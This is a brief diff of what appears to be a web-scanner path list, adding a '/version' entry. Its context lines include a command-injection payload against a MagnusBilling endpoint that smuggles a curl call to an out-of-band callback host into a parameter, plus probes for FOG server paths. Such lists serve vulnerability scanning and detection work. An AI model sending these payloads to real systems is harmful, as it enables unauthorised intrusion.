@@ -545,3 +545,4 @@
 /mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
 /fog/service/getversion.php
 /fog/status/getfiles.php?path[]=
+/version
